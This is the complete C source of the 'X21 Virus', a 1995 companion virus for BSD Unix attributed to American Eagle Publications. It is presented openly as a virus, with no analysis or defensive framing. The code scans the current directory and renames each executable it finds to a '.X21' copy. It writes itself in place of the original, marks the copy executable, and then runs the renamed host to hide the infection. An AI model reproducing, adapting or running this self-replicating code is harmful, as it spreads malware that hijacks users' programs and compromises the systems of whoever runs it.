/* The X21 Virus for BSD Free Unix 2.0.2 (and others)              */
/* (C) 1995 American Eagle Publications, Inc. All rights reserved! */
/* Compile with Gnu C, "GCC X21.C"                                 */

#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>

DIR *dirp;                            /* directory search structure */
struct dirent *dp;                    /* directory entry record */
struct stat st;                       /* file status record */
int stst;                             /* status call status */
FILE *host,*virus;                    /* host and virus files. */
long FileID;                          /* 1st 4 bytes of host */
char buf[512];                        /* buffer for disk reads/writes */
char *lc;                             /* used to search for X21 */
size_t amt_read;                      /* amount read from file */

int main(argc, argv, envp)
  int argc;
  char *argv[], *envp[];
  {
    dirp=opendir(".");                              /* begin directory search */
    while ((dp=readdir(dirp))!=NULL) {           /* have a file, check it out */
      if ((stst=stat((const char *)&dp->d_name,&st))==0) {      /* get status */
        lc=(char *)&dp->d_name;
        while (*lc!=0) lc++;
        lc=lc-3;                    /* lc points to last 3 chars in file name */
        if ((!((*lc=='X')&&(*(lc+1)=='2')&&(*(lc+2)=='1')))       /* "X21"? */
                 &&(st.st_mode&S_IXUSR!=0)) {
    
          strcpy((char *)&buf,(char *)&dp->d_name);
          strcat((char *)&buf,".X21");
          if ((host=fopen((char *)&buf,"r"))!=NULL) fclose(host);
          else {
     



            if (rename((char *)&dp->d_name,(char *)&buf)==0) {/* rename hst */
              if ((virus=fopen(argv[0],"r"))!=NULL) {
                if ((host=fopen((char *)&dp->d_name,"w"))!=NULL)
                  {
                    while (!feof(virus)) {        /* and copy virus to orig */
                      amt_read=512;                            /* host name */
                      amt_read=fread(&buf,1,amt_read,virus);
                      fwrite(&buf,1,amt_read,host);
                      }
                  fclose(host);
                  strcpy((char *)&buf,"./");
                  strcat((char *)&buf,(char *)&dp->d_name);
                  chmod((char *)&buf,S_IRWXU|S_IXGRP);
                  }
                fclose(virus);                /* infection process complete */
                }                                          /* for this file */
              }
            }
          }
        }
      }
    (void)closedir(dirp);          /* infection process complete for this dir */
    strcpy((char *)&buf,argv[0]);          /* the host is this program's name */
    strcat((char *)&buf,".X21");                     /* with an X21 tacked on */
    execve((char *)&buf,argv,envp);            /* execute this program's host */
    }
